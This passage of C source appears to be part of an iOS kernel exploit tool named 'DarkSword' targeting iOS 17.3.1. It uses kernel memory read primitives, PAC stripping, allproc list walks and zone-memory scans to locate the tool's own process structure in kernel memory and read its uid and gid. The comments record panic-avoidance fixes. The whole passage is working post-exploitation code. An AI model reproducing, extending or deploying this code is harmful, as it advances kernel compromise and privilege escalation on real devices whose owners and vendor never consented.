                                      alo, abi, pbase, ppid);
                        discover_name_offset(pbase);
                        PROC_LIST_OFFSET = alo;
                        PROC_NEXT_OFFSET = 0x00;
                        PROC_PREV_OFFSET = 0x08;
                        return ds_finish_ourproc_scope(pbase);
                    }
                    abcur = pbase;
                    abwalk++;
                }
                if (abwalk > 0) {
                    filelog_write("[ourproc] Bug #243B: alt lo=0x%x back: %d procs, no match", alo, abwalk);
                }
            }
        }
        filelog_write("[ourproc] Bug #243B: all alt list offsets exhausted");
    }

    /* Bug #338: Direct p_list walk from kernproc (proc0) via le_next at offset 0x00.
     *
     * Session data (Build 53/54) confirmed:
     *   - kbase+0x321Cxxx is the real BSD allproc LIST_HEAD (scan found it correctly)
     *   - allproc.lh_first = proc0 (proc0 is HEAD of allproc)
     *   - proc0+0x00 = le_next in p_list = next proc's base (heap pointer)
     *   - proc0+0x08 = le_prev in p_list = &allproc.lh_first (kdata, confirms HEAD)
     *
     * Bug #243B with list_off=0x00 could break early because `is_heap_ptr()` (strict,
     * uses zone_safe_min) rejects procs in lower GEN submaps.  This dedicated path
     * uses `is_heap_ptr_relaxed()` (no safe_min) and always follows *(cur + 0x00)
     * as the plain le_next pointer, which for BSD LIST_ENTRY at offset 0 is the
     * direct next proc base. */
    {
        /* Verify proc0+0x08 is kdata (= &allproc) to confirm proc0 is really the
         * HEAD of the real allproc list before walking. */
        uint64_t le_prev_raw = 0;
        bool have_le_prev = ds_kread64_checked(kernproc + 0x08, &le_prev_raw);
        uint64_t le_prev = pac_strip(le_prev_raw);
        bool le_prev_is_kdata = have_le_prev && is_kptr(le_prev) && !is_heap_ptr_relaxed(le_prev);

        uint64_t le_next_raw = 0;
        bool have_le_next = ds_kread64_checked(kernproc, &le_next_raw);
        uint64_t le_next = pac_strip(le_next_raw);

        filelog_write("[ourproc] Bug #338: proc0=0x%llx le_next=0x%llx(heap=%d) le_prev=0x%llx(kdata=%d)",
                      kernproc, le_next, (int)is_heap_ptr_relaxed(le_next),
                      le_prev, (int)le_prev_is_kdata);

        if (have_le_next && have_le_prev && le_prev_is_kdata && is_heap_ptr_relaxed(le_next)) {
            filelog_write("[ourproc] Bug #338: confirmed proc0 is BSD allproc HEAD — walking p_list via +0x00...");
            uint64_t wcur = le_next;
            int wstep = 0;
            int wfound_nonzero = 0;
            uint32_t wmax_pid = 0;
            for (int wi = 0; wi < 4000 && wcur && is_heap_ptr_relaxed(wcur); wi++) {
                uint32_t wpid = 0;
                if (!read_proc_pid_checked(wcur, PROC_PID_OFFSET, &wpid) || !is_plausible_pid(wpid)) {
                    filelog_write("[ourproc] Bug #338: bad PID at step %d proc=0x%llx — stopping", wi, wcur);
                    break;
                }
                if (wpid > 0) wfound_nonzero++;
                if (wpid > wmax_pid) wmax_pid = wpid;
                if (wi < 20 || wpid == (uint32_t)ourpid) {
                    filelog_write("[ourproc] Bug #338: step %d proc=0x%llx pid=%u", wi, wcur, wpid);
                }
                if (wpid == (uint32_t)ourpid) {
                    filelog_write("[ourproc] Bug #338: FOUND ourproc via p_list walk at step %d: proc=0x%llx pid=%d",
                                  wi, wcur, wpid);
                    PROC_LIST_OFFSET = 0x00;
                    PROC_NEXT_OFFSET = 0x00;
                    PROC_PREV_OFFSET = 0x08;
                    discover_name_offset(wcur);
                    return ds_finish_ourproc_scope(wcur);
                }
                wstep = wi + 1;
                uint64_t wnext_raw = 0;
                if (!ds_kread64_checked(wcur, &wnext_raw)) break;
                uint64_t wnext = pac_strip(wnext_raw);
                if (!wnext || wnext == wcur) break;
                if (!is_heap_ptr_relaxed(wnext)) {
                    filelog_write("[ourproc] Bug #338: chain ended at step %d: raw=0x%llx stripped=0x%llx heap=0",
                                  wi, wnext_raw, wnext);
                    break;
                }
                wcur = wnext;
            }
            filelog_write("[ourproc] Bug #338: p_list walk done: steps=%d nonzero_pids=%d max_pid=%u ourpid=%d NOTFOUND",
                          wstep, wfound_nonzero, wmax_pid, ourpid);
        } else {
            filelog_write("[ourproc] Bug #338: skip (le_prev not kdata or le_next not heap)");
        }
    }

    /* Fallback: try the OTHER list entry field offset as NEXT */
    uint32_t alt_next_off = (PROC_NEXT_OFFSET == 0x08) ? 0x00 : 0x08;
    filelog_write("[ourproc] trying alt next_off=0x%x (reversed LIST_ENTRY)...", alt_next_off);
    currentproc = kernproc;
    count = 0;
    while (currentproc != 0 && count < 4000) {
        if (!is_heap_ptr(currentproc)) break;
        uint32_t pid = 0;
        if (!read_proc_pid_checked(currentproc, PROC_PID_OFFSET, &pid) || !is_plausible_pid(pid)) {
            filelog_write("[ourproc] invalid pid on alt walk at step %d: proc=0x%llx pid=0x%x", count, currentproc, pid);
            break;
        }
        if (pid == (uint32_t)ourpid) {
            filelog_write("[ourproc] FOUND via alt next_off=0x%x at step %d: proc=0x%llx", alt_next_off, count, currentproc);
            discover_name_offset(currentproc);
            PROC_NEXT_OFFSET = alt_next_off;
            PROC_PREV_OFFSET = (alt_next_off == 0x00) ? 0x08 : 0x00;
            return ds_finish_ourproc_scope(currentproc);
        }
        /* Read next using the alternative field offset */
        uint64_t raw_link = 0;
        if (!kread64_checked_local(currentproc + PROC_LIST_OFFSET + alt_next_off, &raw_link)) {
            filelog_write("[ourproc] alt walk read failed at step %d", count);
            break;
        }
        uint64_t next = normalize_proc_link_target_with_pid(raw_link, PROC_LIST_OFFSET, PROC_PID_OFFSET);
        if (!next) next = fallback_proc_link_target(raw_link);
        if (!is_heap_ptr(next) || next == currentproc) {
            filelog_write("[ourproc] alt walk ended at step %d: raw=0x%llx next=0x%llx", count, raw_link, next);
            break;
        }
        currentproc = next;
        count++;
    }

    filelog_write("[ourproc] FAILED via alt walk after %d steps", count);

    /* Bug #336 / Bug #334: Final safety guard before the old panic-prone zone scan.
     *
     * Bug #379: after Bug #325..#333 this path is no longer the old broad scan —
     * it now leads into the page-aligned seed-local fallback. So keep the
     * blacklist+retry behavior, but do NOT return 0 after exhaustion; redirect
     * into `bug296_zone_scan` instead. */
    if (main_walk_count >= 10 && main_walk_max_pid > 0 && main_walk_max_pid < (uint32_t)ourpid) {
        filelog_write("[ourproc] Bug #336: allproc chain exhausted (%d procs, max_pid=%u < ourpid=%d) and no alt-list hit",
                      main_walk_count, main_walk_max_pid, ourpid);
        if (g_ourproc_retry_depth < 1 && kernprocaddr) {
            filelog_write("[ourproc] Bug #377: rejecting partial allproc candidate 0x%llx, blacklisting and retrying discovery once",
                          kernprocaddr);
            if (add_candidate_blacklist(kernprocaddr)) {
                filelog_write("[ourproc] Bug #265B: blacklisted candidate 0x%llx (total=%d)",
                              kernprocaddr, g_blacklisted_count);
            }
            g_kernproc_addr = 0;
            g_direct_layout_set = false;
            g_kernproc_is_pid0 = false;
            g_ourproc_retry_depth++;
            uint64_t retry_proc = ourproc();
            g_ourproc_retry_depth--;
            if (retry_proc) return retry_proc;
        }
        filelog_write("[ourproc] Bug #379: partial allproc chain persists after retry — continuing into safe Bug #296/#332 seed-local scan");
        goto bug296_zone_scan;
    }

    /* Bug #299c / Bug #376 / Bug #378: this kernel-only PID=0 detection used to
     * fail closed because the older zone scans were panic-prone. After Bug #325..#332,
     * the remaining fallback is page-aligned and seed-local, so we no longer want to
     * abort here. Keep the detection for telemetry, but continue into the safer scan. */
    if (count >= 2 && max_pid_seen == 0 && (g_kernproc_is_pid0 || g_direct_layout_set)) {
        filelog_write("[ourproc] Bug #299c/376: kernel-only PID=0 chain detected (steps=%d) — skipping unsafe zone scans",
                      count);
        filelog_write("[ourproc] Bug #378: chain stayed in kernel-only PID=0 territory, but continuing into safe Bug #296/#332 seed-local scan");
    }

    /* ====================================================================
     * Bug #240 + Bug #242 + Bug #243: PID zone scan fallback.
     *
     * Session 25c showed kbase+0x321C480 is NOT allproc, and offline_test_v6
     * proved the real allproc is in PPLDATA (unreadable). list_off=0xb0 may
     * be p_pglist (process group), not p_list (allproc).
     *
     * If backward walk (Bug #243A) and alt list offsets (Bug #243B) both
     * failed, fall back to PID zone scan: stride through zone memory
     * looking for a proc with our PID at the correct offset.
     *
     * Bug #242 FIX: kernel_task is in a different address range (0xffffffe0)
     * than user procs (0xffffffdf). Track user proc range separately.
     * ==================================================================== */
    /* Bug #298: old coarse/fine scan logging silenced — known-failing on iOS 17.3.1 (PID=0 kernel-only allproc).
     * Bug #296/298 full zone_map scan below is the real fallback. */
    /* [SILENCED] Bug #240/242/243: starting PID zone scan fallback for pid=%d... */

    /* Collect anchor addresses from the walk, track user procs separately */
    uint64_t scan_anchor = kernproc;
    uint64_t scan_max_seen = kernproc;
    uint64_t scan_min_seen = kernproc;
    uint64_t user_max = 0;
    uint64_t user_min = UINT64_MAX;
    int user_proc_count = 0;

    /* Quick re-walk to find address range of known procs */
    {
        uint64_t cur = kernproc;
        for (int i = 0; i < 300 && cur && is_heap_ptr(cur); i++) {
            if (cur > scan_max_seen) scan_max_seen = cur;
            if (cur < scan_min_seen) scan_min_seen = cur;

            /* Bug #242: track user proc range separately (PID > 0) */
            uint32_t walk_pid = 0;
            if (read_proc_pid_checked(cur, PROC_PID_OFFSET, &walk_pid) && walk_pid > 0) {
                if (cur > user_max) user_max = cur;
                if (cur < user_min) user_min = cur;
                user_proc_count++;
            }

            uint64_t next = 0;
            if (!proc_list_next_checked_pid(cur, PROC_LIST_OFFSET, PROC_PID_OFFSET, &next)) break;
            if (!is_heap_ptr(next) || next == cur) break;
            cur = next;
        }
    }

    /* [SILENCED] zone scan full range log */

    /* Bug #242: prefer user proc range as anchor (avoids kernel_task zone gap) */
    if (user_proc_count > 0 && user_max != 0) {
        /* [SILENCED] user proc range log */
        scan_max_seen = user_max;
        scan_min_seen = user_min;
    } else {
        /* [SILENCED] no user procs */
    }

    /* Scan outward from the user proc range in both directions.
     * Proc zone elements are roughly 0xD58 apart.  Scan up to 2000 entries
     * in each direction = ~27MB coverage per direction. */
    const uint64_t PROC_ZONE_STEP = 0x0D58ULL;
    const int SCAN_STEPS = 2000;

    /* Scan FORWARD (higher addresses) from max seen, BACKWARD from min seen */
    for (int dir = 0; dir < 2; dir++) {
        const char *dir_name = (dir == 0) ? "forward" : "backward";
        uint64_t base = (dir == 0) ? scan_max_seen : scan_min_seen;

        for (int step = 1; step <= SCAN_STEPS; step++) {
            uint64_t probe;
            if (dir == 0) {
                probe = base + (uint64_t)step * PROC_ZONE_STEP;
            } else {
                uint64_t delta = (uint64_t)step * PROC_ZONE_STEP;
                if (base < delta) break;
                probe = base - delta;
            }
            if (!is_heap_ptr(probe)) continue;

            uint32_t probe_pid = 0;
            if (!ds_kread32_checked(probe + PROC_PID_OFFSET, &probe_pid)) {
                break; /* kread failure — stop this direction (silenced) */
            }

            if (probe_pid == (uint32_t)ourpid) {
                /* Candidate found — validate it's a real proc by checking
                 * a few more fields. */
                filelog_write("[ourproc] zone scan %s: PID MATCH at step %d addr=0x%llx!",
                              dir_name, step, probe);

                /* Read a few bytes of the proc to validate:
                 * name at discovered offset, or just check that the
                 * list entry at proc + list_off points to a heap ptr. */
                uint64_t list_val = 0;
                bool list_ok = ds_kread64_checked(probe + PROC_LIST_OFFSET, &list_val);
                uint64_t list_stripped = pac_strip(list_val);
                filelog_write("[ourproc] zone scan validate: *(proc+list_off)=0x%llx heap=%d",
                              list_val, (int)is_heap_ptr_relaxed(list_stripped));

                if (!list_ok || (!is_heap_ptr_relaxed(list_stripped) && list_stripped != 0)) {
                    filelog_write("[ourproc] zone scan: false PID match at 0x%llx, continuing", probe);
                    continue;
                }

                /* SUCCESS — found our proc via zone scan */
                discover_name_offset(probe);
                char name[64] = {0};
                if (PROC_NAME_OFFSET != 0) {
                    ds_kread(probe + PROC_NAME_OFFSET, name, 32);
                } else {
                    strlcpy(name, "<unknown>", sizeof(name));
                }
                filelog_write("[ourproc] FOUND via PID zone scan: proc=0x%llx pid=%d name='%s'",
                              probe, ourpid, name);

                uint32_t uid = ds_kread32(probe + PROC_UID_OFFSET);
                uint32_t gid = ds_kread32(probe + PROC_GID_OFFSET);
                filelog_write("[ourproc] uid=%u gid=%u", uid, gid);
                return ds_finish_ourproc_scope(probe);
            }
        }
    }

    /* Last resort: fine-grained scan around known user procs.
     * Bug #242: scan ±0x100000 (1MB) around user proc max, not kernel_task.
     * Try every 0x10 bytes. Expensive but definitive.
     * Bug #298: coarse scan failed log silenced (known-failing on this iOS). */
    {
        uint64_t center = scan_max_seen;
        uint64_t range = 0x100000ULL;  /* Bug #242: 1MB instead of 64KB */
        uint64_t start = (center > range) ? (center - range) : center;
        uint64_t end = center + range;
        int fine_reads = 0;
        const int MAX_FINE_READS = 40000;  /* Bug #242: 40K reads for 1MB at step 0x10 */

        for (uint64_t addr = start; addr < end && fine_reads < MAX_FINE_READS; addr += 0x10) {
            if (!is_heap_ptr(addr)) continue;
            uint32_t p = 0;
            if (!ds_kread32_checked(addr + PROC_PID_OFFSET, &p)) {
                fine_reads++;
                continue;
            }
            fine_reads++;
            if (p == (uint32_t)ourpid) {
                /* Validate with list_off check */
                uint64_t lv = 0;
                ds_kread64_checked(addr + PROC_LIST_OFFSET, &lv);
                uint64_t ls = pac_strip(lv);
                if (is_heap_ptr_relaxed(ls) || ls == 0) {
                    discover_name_offset(addr);
                    char name[64] = {0};
                    if (PROC_NAME_OFFSET != 0) ds_kread(addr + PROC_NAME_OFFSET, name, 32);
                    else strlcpy(name, "<unknown>", sizeof(name));
                    filelog_write("[ourproc] FOUND via fine zone scan: proc=0x%llx pid=%d name='%s'",
                                  addr, ourpid, name);
                    return ds_finish_ourproc_scope(addr);
                }
            }
        }
        filelog_write("[ourproc] fine zone scan: %d reads not found (old scan)", fine_reads); /* Bug #298: 1 line summary only */
    }

bug296_zone_scan:

    /* Bug #296: allproc chain on iOS 17.3.1 only contains kernel threads (PID=0).
     * User procs (including our own) are NOT reachable via the allproc forward walk.
     *
     * Bug #299a — PANIC ROOT CAUSE: scanning from safe_min (zmin+25%) or kernproc-4GB
     * causes "Kernel data abort" at kbase+0xE04810 with FAR well above zone_map_max.
     * Mechanism: sooptcopyout() → zone_element_bounds_check(src) reads zone_page_metadata
     * for the source address. Zone metadata for lower zone submaps (0xffffffdc..0xffffffdd..)
     * lives in a sequestered region that is NOT mapped → translation fault L3 → panic.
     * proc0 (kernproc, 0xffffffdf..) is in a higher submap where metadata IS mapped.
     * Fix: start scan at kernproc (guaranteed safe).
     *
     * Bug #299b — MISSED PROCS: kalloc.type5.1024 = 1024 B/element → 4 elements per
     * 4KB page at offsets 0x000, 0x400, 0x800, 0xC00. Old 0x1000 stride only visited
     * offset-0 elements, missing 75% of user procs including DarkSword itself.
     * Fix: stride = 0x400 (1024 B) to visit every element in each page. */
    {
        uint64_t zmax = ds_get_zone_map_max();
        uint64_t zmin = ds_get_zone_map_min();
        if (!zmin || !zmax || zmax <= zmin) {
            filelog_write("[ourproc] Bug #296: zone bounds unavailable, skip");
        } else if (!kernproc || !is_heap_ptr_relaxed(kernproc)) {
            filelog_write("[ourproc] Bug #296: kernproc invalid (0x%llx), skip", kernproc);
        } else {
            /* Bug #320: session 26 shows the accepted proc addresses are page-aligned
             * (e.g. kernproc/user procs at ...000), and the old Bug #299b 0x400 stride
             * immediately re-probes interior offsets that are not valid standalone zone
             * objects on this device. The fresh panic happens right after Bug #296/299
             * starts with a 4-byte read overflowing an object of size 0.
             *
             * When the known proc anchors are page-aligned, treat them as page-granular
             * objects and scan only a bounded window around the observed proc range using
             * 0x1000 stride. Fall back to the older 0x400 path only when the anchors are
             * not page-aligned. */
            uint64_t anchor_min = (user_proc_count > 0 && user_min != UINT64_MAX) ? user_min : scan_min_seen;
            uint64_t anchor_max = (user_proc_count > 0 && user_max != 0) ? user_max : scan_max_seen;
            if (!anchor_min || !is_heap_ptr(anchor_min)) anchor_min = kernproc;
            if (!anchor_max || !is_heap_ptr(anchor_max)) anchor_max = kernproc;
            if (anchor_max < anchor_min) anchor_max = anchor_min;

            const bool bsd_direct_layout = (PROC_LIST_OFFSET == 0x0 &&
                                            PROC_NEXT_OFFSET == 0x0 &&
                                            PROC_PREV_OFFSET == 0x8);
            uint64_t raw_anchor_min = anchor_min;
            uint64_t raw_anchor_max = anchor_max;

            bool page_aligned_scan = ((kernproc & 0xFFFULL) == 0) &&
                                     ((anchor_min & 0xFFFULL) == 0) &&
                                     ((anchor_max & 0xFFFULL) == 0);
            if (!page_aligned_scan && bsd_direct_layout) {
                /* Bug #381: session 25i showed that BSD direct-layout mode often reaches
                 * fallback from a real kernel_task proc that sits at an interior offset
                 * inside its 4KB proc page (e.g. ...d4b0), not at page base. Bug #380
                 * only forced the safe path when kernproc itself was page-aligned, so
                 * kernproc-mode still fell through to the legacy 0x400 broad scan and
                 * reproduced the same zone bound panic.
                 *
                 * In confirmed BSD LIST mode the safe fallback should key off PROC PAGES,
                 * not whether the current proc pointer is already page-based. Normalize
                 * the chosen anchors (or kernproc as fallback) to page bases and force
                 * the page-aligned seed-local scan unconditionally. */
                uint64_t norm_min = anchor_min & ~0xFFFULL;
                uint64_t norm_max = anchor_max & ~0xFFFULL;
                if (!norm_min || !is_heap_ptr(norm_min)) {
                    norm_min = kernproc & ~0xFFFULL;
                }
                if (!norm_max || !is_heap_ptr(norm_max)) {
                    norm_max = norm_min;
                }
                if (norm_max < norm_min) norm_max = norm_min;

                anchor_min = norm_min;
                anchor_max = norm_max;
                page_aligned_scan = true;
                filelog_write("[ourproc] Bug #381: forcing page-aligned seed-local scan under BSD direct layout "
                              "(kernproc=0x%llx anchors 0x%llx..0x%llx -> 0x%llx..0x%llx)",
                              kernproc, raw_anchor_min, raw_anchor_max, anchor_min, anchor_max);
            } else if (!page_aligned_scan) {
                /* Bug #384: session 25d shows the non-page-aligned fallback still
                 * reaches the legacy broad zone scan branch (page_aligned=0), which
                 * now reproduces a Kernel data abort. Even when proc pointers are
                 * interior element addresses, the safer search strategy is still to
                 * normalize to 4KB proc pages and stay inside local seed windows. */
                uint64_t norm_min = anchor_min & ~0xFFFULL;
                uint64_t norm_max = anchor_max & ~0xFFFULL;
                if (!norm_min || !is_heap_ptr(norm_min)) {
                    norm_min = kernproc & ~0xFFFULL;
                }
                if (!norm_max || !is_heap_ptr(norm_max)) {
                    norm_max = norm_min;
                }
                if (norm_max < norm_min) norm_max = norm_min;

                anchor_min = norm_min;
                anchor_max = norm_max;
                page_aligned_scan = true;
                filelog_write("[ourproc] Bug #384: forcing page-aligned seed-local scan for non-aligned anchors "
                              "(kernproc=0x%llx anchors 0x%llx..0x%llx -> 0x%llx..0x%llx)",
                              kernproc, raw_anchor_min, raw_anchor_max, anchor_min, anchor_max);
            }

            const uint64_t ZONE_STRIDE = page_aligned_scan ? 0x1000ULL : 0x400ULL;
            const int ZONE296_MAX = 1000000;  /* 1M — more than enough with smart skip */
            uint32_t zone_pid_offs[2] = {0};
            int zone_pid_count = 0;
            zone_pid_offs[zone_pid_count++] = PROC_PID_OFFSET;
            if (PROC_PID_OFFSET != 0x60) {
                zone_pid_offs[zone_pid_count++] = 0x60;
            }

            /* Bug #325: fresh Bug #324 evidence shows that even a one-sided
             * contiguous page scan still walks into toxic non-proc pages after a
             * few MB. Replace the contiguous range scan with local seed windows
             * around proc pages that were already observed in the forward walk.
             * This keeps probing close to known-good proc neighborhoods instead of
             * sweeping through huge holes between clusters. */
            if (page_aligned_scan) {
                static const uint64_t bug325_seed_windows[] = {
                    0x4000ULL,
                    0x40000ULL,
                    0x100000ULL,
                    0x400000ULL,
                    0x4000000ULL,   /* Bug #332: 64 MB forward phase — seeds are kernel-thread
                                     * pages; user proc for DarkSword is allocated far ahead
                                     * in the same GEN0/GEN1 heap region. Panic-free because
                                     * scan stays within zone_map and each probe is within
                                     * 4-byte read at +pid_off inside a 1024-byte proc element.
                                     * Forward-only (pre_window=0) per Bug #324. */
                };
                static const int bug329_gap_limits[] = {
                    4,
                    16,
                    64,
                    128,
                    512,            /* Bug #332: wide phase tolerates larger inter-cluster gaps */
                };
                uint64_t seed_pages[64];
                uint64_t seed_slot_offsets[64];
                int seed_count = 0;
                int slot_count = 0;
                int total_z296 = 0;

                uint64_t proc0_chain_seeds[16];
                int proc0_chain_count = 0;
                {
                    uint64_t p0_next = 0;
                    if (ds_kread64_checked(kernproc, &p0_next)) {
                        uint64_t wcur = pac_strip(p0_next);
                        for (int wi = 0; wi < 16 && wcur && is_heap_ptr(wcur); wi++) {
                            bool seen = false;
                            for (int pj = 0; pj < proc0_chain_count; pj++) {
                                if (proc0_chain_seeds[pj] == wcur) {
                                    seen = true;
                                    break;
                                }
                            }
                            if (!seen && proc0_chain_count < 16) {
                                proc0_chain_seeds[proc0_chain_count++] = wcur;
                            }
                            uint64_t wnext = 0;
                            if (!ds_kread64_checked(wcur, &wnext)) break;
                            uint64_t wnext_s = pac_strip(wnext);
                            if (!is_heap_ptr(wnext_s) || wnext_s == wcur) break;
                            wcur = wnext_s;
                        }
                    }
                }

                for (int fi = 0; fi < fwd_count && seed_count < 64; fi++) {
                    uint64_t seed = fwd_procs[fi] & ~0xFFFULL;
                    uint64_t slot = fwd_procs[fi] & 0xFFFULL;
                    if (!seed || !is_heap_ptr(seed)) continue;
                    bool seen = false;
                    for (int si = 0; si < seed_count; si++) {
                        if (seed_pages[si] == seed) {
                            seen = true;
                            break;
                        }
                    }
                    if (!seen) seed_pages[seed_count++] = seed;

                    bool slot_seen = false;
                    for (int so = 0; so < slot_count; so++) {
                        if (seed_slot_offsets[so] == slot) {
                            slot_seen = true;
                            break;
                        }
                    }
                    if (!slot_seen && slot_count < 64) {
                        seed_slot_offsets[slot_count++] = slot;
                    }
                }
                for (int pi = 0; pi < proc0_chain_count && seed_count < 64; pi++) {
                    uint64_t seed = proc0_chain_seeds[pi] & ~0xFFFULL;
                    uint64_t slot = proc0_chain_seeds[pi] & 0xFFFULL;
                    if (!seed || !is_heap_ptr(seed)) continue;
                    bool seen = false;
                    for (int si = 0; si < seed_count; si++) {
                        if (seed_pages[si] == seed) {
                            seen = true;
                            break;
                        }
                    }
                    if (!seen) seed_pages[seed_count++] = seed;

                    bool slot_seen = false;
                    for (int so = 0; so < slot_count; so++) {
                        if (seed_slot_offsets[so] == slot) {
                            slot_seen = true;
                            break;
                        }
                    }
                    if (!slot_seen && slot_count < 64) {
                        seed_slot_offsets[slot_count++] = slot;
                    }
                }
                if (seed_count == 0) {
                    seed_pages[seed_count++] = anchor_min & ~0xFFFULL;
                }
                {
                    int base_seed_count = seed_count;
                    for (int si = 0; si < base_seed_count && seed_count < 64; si++) {
                        for (int delta_pages = -2; delta_pages <= 2 && seed_count < 64; delta_pages++) {
                            if (delta_pages == 0) continue;
                            uint64_t delta = (uint64_t)(llabs(delta_pages) * 0x1000LL);
                            uint64_t neigh = (delta_pages < 0)
                                           ? ((seed_pages[si] > delta) ? (seed_pages[si] - delta) : 0)
                                           : (seed_pages[si] + delta);
                            if (!neigh || !is_heap_ptr(neigh)) continue;
                            bool seen = false;
                            for (int sj = 0; sj < seed_count; sj++) {
                                if (seed_pages[sj] == neigh) {
                                    seen = true;
                                    break;
                                }
                            }
                            if (!seen) seed_pages[seed_count++] = neigh;
                        }
                    }
                }
                if (slot_count == 0) {
                    seed_slot_offsets[slot_count++] = anchor_min & 0xFFFULL;
                }

                /* Bug #385: current device does not place proc objects on fixed
                 * synthetic page slots like 0x0/0x400/0x800/0xC00. Use the REAL
                 * intra-page offsets observed in forward-walked procs, and only
                 * probe those offsets on nearby pages. */
                filelog_write("[ourproc] Bug #385: seed-page prepass seeds=%d observed_slots=%d proc0_chain=%d pid_offs=%d/0x%x%s",
                              seed_count, slot_count, proc0_chain_count, zone_pid_count, zone_pid_offs[0],
                              (zone_pid_count > 1) ? " +0x60" : "");
                for (int si = 0; si < seed_count; si++) {
                    for (int bi = 0; bi < slot_count; bi++) {
                        uint64_t cand = seed_pages[si] + seed_slot_offsets[bi];
                        if (!is_heap_ptr(cand)) continue;

                        uint32_t zpid = 0;
                        uint32_t zpid_off = 0;
                        bool pid_hit = false;
                        for (int zoi = 0; zoi < zone_pid_count; zoi++) {
                            uint32_t probe_pid = 0;
                            uint32_t probe_off = zone_pid_offs[zoi];
                            if (!ds_kread32_checked(cand + probe_off, &probe_pid)) continue;
                            if (probe_pid == (uint32_t)ourpid) {
                                zpid = probe_pid;
                                zpid_off = probe_off;
                                pid_hit = true;
                                break;
                            }
                        }

                        uint64_t lv = 0;
                        bool lv_ok = ds_kread64_checked(cand + PROC_LIST_OFFSET, &lv);
                        uint64_t ls = pac_strip(lv);
                        bool lhp = is_heap_ptr_relaxed(ls) || is_kernel_data_ptr(ls) || ls == 0;
                        uint64_t proc_ro_raw = 0, proc_ro = 0, ro_task_raw = 0, ro_task = 0;
                        bool proc_ro_ok = false, ro_task_ok = false;
                        if (ds_kread64_checked(cand + O_PROC_RO, &proc_ro_raw)) {
                            proc_ro = pac_strip(proc_ro_raw);
                            proc_ro_ok = is_kptr(proc_ro);
                        }
                        if (proc_ro_ok && ds_kread64_checked(proc_ro + O_PROC_RO_TASK, &ro_task_raw)) {
                            ro_task = pac_strip(ro_task_raw);
                            ro_task_ok = is_kptr(ro_task);
                        }

                        if (pid_hit) {
                            if (zpid_off && zpid_off != PROC_PID_OFFSET) {
                                filelog_write("[ourproc] Bug #327: seed-slot switching PID_OFFSET 0x%x -> 0x%x at proc=0x%llx",
                                              PROC_PID_OFFSET, zpid_off, cand);
                                PROC_PID_OFFSET = zpid_off;
                            }
                            filelog_write("[ourproc] Bug #296/327: pid=%u at 0x%llx pid_off=0x%x list=0x%llx hp=%d ro=%d task=%d",
                                          zpid, cand, PROC_PID_OFFSET, lv, (int)lhp, (int)proc_ro_ok, (int)ro_task_ok);
                            bool name_ok = proc_name_matches_ours(cand);
                            if ((lv_ok && lhp) || ro_task_ok || name_ok) {
                                add_unique_proc_candidate(proc_candidates, &proc_candidate_count, 192, cand);
                                char zname[64] = {0};
                                if (PROC_NAME_OFFSET) {
                                    if (!kread_proc_name_bounded(cand, PROC_NAME_OFFSET, zname, sizeof(zname))) {
                                        strlcpy(zname, "<unknown>", sizeof(zname));
                                    }
                                } else {
                                    strlcpy(zname, "<unknown>", sizeof(zname));
                                }
                                filelog_write("[ourproc] Bug #327: FOUND via seed-slot proc=0x%llx pid=%d name='%s' proof[list=%d task=%d name=%d]",
                                              cand, ourpid, zname, (int)(lv_ok && lhp), (int)ro_task_ok, (int)name_ok);
                                return cand;
                            }
                        }

                    }
                }

                char bug325_build[32] = {0};
                bool bug325_have_build = get_os_build(bug325_build, sizeof(bug325_build));
                bool bug325_exact_21d61 = bug325_have_build && strcmp(bug325_build, "21D61") == 0;
                int bug325_phase_count = (int)(sizeof(bug325_seed_windows) / sizeof(bug325_seed_windows[0]));
                const char *wide_seed_scan_env = getenv("DS_ENABLE_WIDE_SEED_SCAN");
                if (bug325_exact_21d61 && !(wide_seed_scan_env && wide_seed_scan_env[0] == '1')) {
                    /* Bug #455: fresh 21D61 panic 0xffffffdf08be8060 matches the
                     * 64MB phase-4 page-seed PID probe pattern (page_base+0x60).
                     * Phases 0..3 completed, then phase 4 immediately entered a
                     * much wider range and the device panicked. Keep the local,
                     * panic-free phases up to 4MB, but disable the 64MB sweep by
                     * default on exact 21D61 unless explicitly re-enabled for
                     * triage. */
                    bug325_phase_count -= 1;
                    filelog_write("[ourproc] Bug #455: exact 21D61 disables 64MB seed phase by default after zone-bound panic; max_window=0x%llx (set DS_ENABLE_WIDE_SEED_SCAN=1 to re-enable)",
                                  bug325_seed_windows[bug325_phase_count - 1]);
                }
                filelog_write("[ourproc] Bug #332: extended local seed scan with %d phases (max_window=0x%llx)",
                              bug325_phase_count, bug325_seed_windows[bug325_phase_count - 1]);

                for (int phase = 0; phase < bug325_phase_count; phase++) {
                    uint64_t window = bug325_seed_windows[phase];
                    int max_cfails = bug329_gap_limits[phase];
                    filelog_write("[ourproc] Bug #325: local page-seed scan phase=%d "
                                  "window=0x%llx seeds=%d stride=0x%llx pid_offs=%d/0x%x%s gap_limit=%d",
                                  phase, window, seed_count, ZONE_STRIDE,
                                  zone_pid_count, zone_pid_offs[0],
                                  (zone_pid_count > 1) ? " +0x60" : "",
                                  max_cfails);

                    for (int si = 0; si < seed_count; si++) {
                        uint64_t p296 = seed_pages[si];
                        uint64_t p296_end = p296 + window;
                        if (p296 < zmin) p296 = zmin;
                        if (p296_end < p296 || p296_end > zmax) p296_end = zmax;
                        p296 &= ~(ZONE_STRIDE - 1ULL);
                        p296_end = (p296_end + (ZONE_STRIDE - 1ULL)) & ~(ZONE_STRIDE - 1ULL);

                        filelog_write("[ourproc] Bug #296/325: seed[%d] scan "
                                      "[0x%llx..0x%llx] base=0x%llx pid=%d ...",
                                      si, p296, p296_end, seed_pages[si], ourpid);

                        int z296 = 0;
                        int cfails = 0;
                        while (p296 < p296_end && z296 < ZONE296_MAX) {
                            z296++;
                            total_z296++;
                            uint32_t zpid = 0;
                            uint32_t zpid_off = 0;
                            uint64_t zcand = 0;
                            bool z296_ok = false;
                            if (is_heap_ptr(p296)) {
                                for (int bi = 0; bi < slot_count; bi++) {
                                    uint64_t cand = p296 + seed_slot_offsets[bi];
                                    if (!is_heap_ptr(cand)) continue;
                                    for (int zoi = 0; zoi < zone_pid_count; zoi++) {
                                        uint32_t probe_pid = 0;
                                        uint32_t probe_off = zone_pid_offs[zoi];
                                        if (!ds_kread32_checked(cand + probe_off, &probe_pid)) continue;
                                        z296_ok = true;
                                        if (probe_pid == (uint32_t)ourpid) {
                                            zpid = probe_pid;
                                            zpid_off = probe_off;
                                            zcand = cand;
                                            break;
                                        }
                                    }
                                    if (zcand) break;
                                }
                            }
                            if (!z296_ok) {
                                cfails++;
                                if (cfails >= max_cfails) break;
                                p296 += ZONE_STRIDE;
                                continue;
                            }

